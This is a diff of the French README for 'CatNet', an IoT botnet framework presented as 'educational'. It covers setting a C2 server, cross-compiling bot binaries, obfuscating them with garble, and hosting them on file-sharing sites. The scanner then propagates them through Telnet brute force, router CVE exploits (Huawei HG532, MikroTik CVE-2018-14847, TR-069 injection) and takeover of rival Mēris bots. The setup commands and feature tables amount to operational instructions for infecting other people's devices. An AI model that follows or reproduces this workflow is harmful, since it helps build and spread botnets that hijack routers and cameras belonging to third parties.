@@ -1,106 +1,141 @@
-# CatNet
+```
+   ██████╗ █████╗ ████████╗███╗   ██╗███████╗████████╗
+  ██╔════╝██╔══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
+  ██║     ███████║   ██║   ██╔██╗ ██║█████╗     ██║   
+  ██║     ██╔══██║   ██║   ██║╚██╗██║██╔══╝     ██║   
+  ╚██████╗██║  ██║   ██║   ██║ ╚████║███████╗   ██║   
+   ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
+```
 
-![CatNet](https://img.shields.io/badge/CatNet-Scanner-red)
+<div align="center">
 
-> ⚠️ **Usage éducatif et recherche en sécurité uniquement.** Utiliser ces outils sur des systèmes sans autorisation explicite est illégal.
+```
+      /\_/\
+     ( o.o )  ~ nyaa ~
+      > ^ <
+     /|   |\
+    (_|   |_)
+```
 
-## Vue d'ensemble
+**`[ BY CAT TOOLS // v2.0 // 2026 ]`**
 
-CatNet est un framework de scan/infection IoT composé de trois parties :
+*Scanner IoT educatif — Multi-archi — MikroTik — Mēris Takeover*
 
-| Composant | Fichier | Rôle |
-|-----------|---------|------|
-| Interface principale | `main.py` | Menu interactif, compilation, upload, orchestration |
-| Scanner | `fiber.go` | Scan réseau, exploitation, propagation |
-| Bot | `bot_discord.go` | Agent installé sur les cibles infectées |
+![Python](https://img.shields.io/badge/Python-3.10+-green?style=for-the-badge&logo=python&logoColor=white)
+![Go](https://img.shields.io/badge/Scanner-Go-00ADD8?style=for-the-badge&logo=go&logoColor=white)
+![Platform](https://img.shields.io/badge/Target-IoT%2FLinux-FF6B35?style=for-the-badge)
+![Arch](https://img.shields.io/badge/Arch-MIPS%20%7C%20ARM%20%7C%20x86-blueviolet?style=for-the-badge)
+![License](https://img.shields.io/badge/License-Educational-red?style=for-the-badge)
+
+</div>
 
 ---
 
-## Dépendances — installation manuelle requise
+## ⚠️ Avertissement
 
-Le programme **ne les installe pas automatiquement**. Toutes ces étapes sont obligatoires.
+> Ce projet est **strictement éducatif**. L'utilisation sur des systèmes sans autorisation explicite est **illégale**. Les auteurs déclinent toute responsabilité en cas d'utilisation abusive.
 
-### 1. Python 3.10+
+---
 
+## 🗂️ Structure
+
+```
+catnet/
+├── main.py          ← Menu TUI interactif — compilation, upload, orchestration
+├── fiber.go         ← Scanner Go — exploitation, brute-force, propagation
+├── bot_discord.go   ← Agent déployé sur cibles (multi-archi)
+└── builds/          ← Binaires compilés (auto-généré)
+```
+
+---
+
+## ⚡ Fonctionnalités
+
+| Module | Description |
+|:------:|-------------|
+| 🔍 **Scanner** | Scan réseau multi-port, goroutines parallèles, timeouts adaptatifs |
+| 🤖 **Bot multi-archi** | MIPS · MIPSLE · ARM · ARM64 · x86 · x86\_64 · PPC · SH4 · M68K · SPARC |
+| ☁️ **Upload auto** | catbox.moe / transfer.sh / 0x0.st / serveur perso — URLs embarquées au build |
+| 🖥️ **Orchestration** | Sessions `screen`, scan par plages IP ou liste, jobs arrière-plan |
+| 📡 **MikroTik** | CVE-2018-14847 · Brute API 8728 · SSH · Mēris SOCKS5 takeover |
+| 💥 **HTTP Exploits** | Realtek · Huawei HG532 · D-Link · TP-Link · TOTOLINK · DVR · TR-069 |
+| 📊 **Log viewer** | Vue live scanner, cibles, imports, IDB — menu `[t]` |
+
+---
+
+## 🔌 Ports par défaut
+
+```
+┌────────┬──────────────────────────────┐
+│  PORT  │  SERVICE                     │
+├────────┼──────────────────────────────┤
+│   23   │  Telnet                      │
+│   80   │  HTTP                        │
+│  443   │  HTTPS                       │
+│  2000  │  MikroTik Bandwidth-Test     │
+│  5000  │  UPnP                        │
+│  5678  │  Mēris SOCKS5               │
+│  7547  │  TR-069 / CWMP               │
+│  8080  │  HTTP Alt                    │
+│  8291  │  MikroTik Winbox             │
+│  8443  │  HTTPS Alt                   │
+│  8728  │  RouterOS API                │
+│  9527  │  DVR / Caméras               │
+│ 34567  │  DVR / Caméras               │
+│ 37215  │  Huawei HG532                │
+└────────┴──────────────────────────────┘
+```
+
+---
+
+## 📦 Installation
+
+> Le programme **ne gère pas les dépendances automatiquement** — tout est manuel.
+
+### 🐍 Python 3.10+
 ```bash
 sudo apt update && sudo apt install -y python3 python3-pip
 ```
 
-### 2. Go (1.21+)
-
-Le programme cherche Go dans `/usr/local/go/bin/go`. La version `apt` est souvent trop ancienne.
-
+### 🐹 Go 1.21+ (obligatoire — version apt trop ancienne)
 ```bash
-# Télécharger et installer Go officiel
 wget https://go.dev/dl/go1.22.4.linux-amd64.tar.gz
 sudo rm -rf /usr/local/go
 sudo tar -C /usr/local -xzf go1.22.4.linux-amd64.tar.gz
-echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
-source ~/.bashrc
-go version   # doit afficher go1.22.x
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
+go version
 ```
 
-### 3. garble (obfuscateur Go, optionnel)
-
-Requis uniquement si tu actives l'obfuscation dans le menu. garble appelle `go` en interne — Go doit être dans le PATH avant d'installer garble.
-
+### 🔒 garble — obfuscation Go (optionnel)
 ```bash
 go install mvdan.cc/garble@latest
-# Le binaire sera dans ~/go/bin/garble
-# Ajouter au PATH si pas déjà fait :
-echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc
-source ~/.bashrc
+echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc && source ~/.bashrc
 ```
 
-### 4. zmap
-
-Requis pour le scan réseau (mode "IP unique" et scans sur plages).
-
+### 🗺️ zmap
 ```bash
 sudo apt install -y zmap
 ```
+> **Raspberry Pi / ARM** — compiler depuis les sources si apt absent :
+> ```bash
+> sudo apt install -y cmake libgmp-dev libpcap-dev libjson-c-dev libbytesize-dev
+> git clone https://github.com/zmap/zmap.git && cd zmap
+> mkdir build && cd build && cmake .. && make -j$(nproc) && sudo make install
+> ```
 
-Sur Raspberry Pi / ARM, zmap peut nécessiter une compilation depuis les sources si le paquet apt n'est pas disponible :
-
+### 🛠️ Outils de base
 ```bash
-sudo apt install -y cmake libgmp-dev libpcap-dev libjson-c-dev libbytesize-dev
-git clone https://github.com/zmap/zmap.git && cd zmap
-mkdir build && cd build && cmake .. && make -j$(nproc) && sudo make install
+sudo apt install -y screen masscan curl
 ```
 
-### 5. screen
-
-Requis pour lancer les scans en arrière-plan.
-
-```bash
-sudo apt install -y screen
-```
-
-### 6. masscan (optionnel)
-
-Alternative à zmap pour les scans rapides.
-
-```bash
-sudo apt install -y masscan
-```
-
-### 7. curl
-
-Requis pour l'upload des binaires (catbox.moe / transfer.sh / serveur perso).
-
-```bash
-sudo apt install -y curl
-```
-
-### 8. Compilateurs croisés (pour compiler le bot multi-archi)
-
+### 🔧 Compilateurs croisés (bot multi-archi)
 ```bash
 sudo apt install -y \
   gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu \
   gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu \
   gcc-sparc64-linux-gnu gcc-multilib libc6-dev-i386
 
-# Headers manquants (erreur asm/socket.h)
+# Fix erreur asm/socket.h
 for arch in i386-linux-gnu mips-linux-gnu arm-linux-gnueabi aarch64-linux-gnu \
             powerpc-linux-gnu sh4-linux-gnu m68k-linux-gnu sparc64-linux-gnu; do
   sudo mkdir -p /usr/$arch/include
@@ -110,72 +145,42 @@ done
 
 ---
 
-## Lancement
+## 🚀 Lancement
 
 ```bash
 sudo python3 main.py
 ```
-
-> Le programme nécessite les droits root pour zmap/masscan (raw sockets).
-
----
-
-## Flux de travail typique
-
-1. **Menu principal → [1] Services** pour configurer l'IP C2, le port, le mode de distribution
-2. **[2] Compiler les bots** — compile `bot_discord.go` pour toutes les architectures
-3. **[3] Upload** — uploade les binaires compilés sur catbox.moe (ou ton serveur)
-4. **[4] Compiler fiber** — compile le scanner avec les URLs des bots embarquées
-5. **[5] Lancer un scan** — choisir une plage IP ou charger une liste, choisir les ports
-6. **[t] Logs IP unique** — voir les logs en direct du scan en cours
+> Root requis pour zmap/masscan (raw sockets).
 
 ---
 
-## Distribution des binaires
+## 🔄 Flux de travail
 
-Deux modes disponibles dans le menu Services :
+```
+[1] Services      →  configurer IP C2, port, mode distrib
+[2] Compiler bot  →  compile bot_discord.go toutes archi
+[3] Upload        →  upload binaires catbox.moe / serveur perso
+[4] Compiler fiber →  scanner avec URLs bots embarquées
+[5] Lancer scan   →  plage IP ou liste, choix ports
+[t] Logs live     →  suivi en direct du scan
+```
+
+---
+
+## ☁️ Distribution des binaires
 
 | Mode | Description |
 |------|-------------|
-| `auto` | Upload sur catbox.moe ou transfer.sh. Pas besoin d'IP publique. |
-| `local` | fiber sert lui-même les fichiers. Nécessite une IP/port accessible depuis Internet. |
+| `auto` | Upload catbox.moe / transfer.sh — aucune IP publique requise |
+| `local` | fiber sert les fichiers — IP/port accessible depuis Internet |
 
-**Serveur perso** : tu peux renseigner l'URL de ton propre serveur d'hébergement. Il doit accepter un POST multipart sur `/upload.php` et retourner `{"success":true,"url":"..."}`.
-
----
-
-## Ports scannés par défaut
-
-| Port | Service |
-|------|---------|
-| 80, 8080, 81 | HTTP |
-| 443, 8443 | HTTPS |
-| 23 | Telnet |
-| 7547 | TR-069 (CWMP) |
-| 37215 | Huawei HG532 |
-| 5000 | UPnP |
-| 34567, 9527 | DVR/caméras |
-| 2000 | MikroTik bandwidth-test |
-| 8291 | MikroTik Winbox |
-| 8728 | RouterOS API |
-| 5678 | Mēris SOCKS5 |
+**Serveur perso** → POST multipart `/upload.php` → `{"success":true,"url":"..."}`
 
 ---
 
-## Modules d'exploitation (fiber.go)
-
-- **Telnet brute-force** — liste de credentials par défaut IoT
-- **HTTP exploits** — CVE Realtek, Huawei HG532, D-Link, TP-Link, TOTOLINK, etc.
-- **TR-069 / CWMP** — injection de commandes
-- **MikroTik** — CVE-2018-14847 (Winbox, RouterOS < 6.42.1), brute API port 8728, SSH
-- **Mēris takeover** — détecte SOCKS5 port 5678 → supprime schedulers adverses → injecte persistance
-
----
-
-## Dépannage
+## 🐛 Dépannage
 
 **`garble: can't find Go toolchain`**
-Go n'est pas dans le PATH du sous-processus. Vérifier :
 ```bash
 which go   # doit retourner /usr/local/go/bin/go
 ```
@@ -185,17 +190,26 @@ which go   # doit retourner /usr/local/go/bin/go
 sudo apt install -y screen
 ```
 
-**`0 Attempted` après plusieurs minutes (scan IP unique)**
-zmap n'a trouvé aucune IP sur ce port dans la plage donnée. fiber attend sur stdin et ne s'arrête pas. Tuer manuellement le screen et relancer avec une autre plage ou un autre port.
+**`0 Attempted` après plusieurs minutes**
+zmap n'a trouvé aucun host ouvert sur ce port. fiber attend stdin indéfiniment — tuer le screen, changer de plage ou de port.
 
-**Compilation croisée : `asm/socket.h: No such file or directory`**
-Voir la section compilateurs croisés ci-dessus (liens symboliques asm-generic).
+**`asm/socket.h: No such file or directory`**
+Voir section compilateurs croisés — symlinks asm-generic manquants.
 
-**Les bots compilés ne s'exécutent pas sur la cible**
-Vérifier l'architecture : `file bot.arm` doit correspondre à la cible. Utiliser `bot.mipsle` pour les routeurs MIPS little-endian (Mikrotik CHR, certains TP-Link).
+**Bot ne s'exécute pas sur la cible**
+`file bot.arm` pour vérifier l'archi. Utiliser `bot.mipsle` pour MIPS little-endian.
 
 ---
 
-## Licence
+## Credits
 
-Usage éducatif uniquement.
+**by cat-project-hat** *(we do the best for you)*
+
+---
+
+```
+   /\_/\
+  ( o.o )   CATNET v2.0 // BY CAT TOOLS // 2026
+   > ^ <
+  /_____\
+```
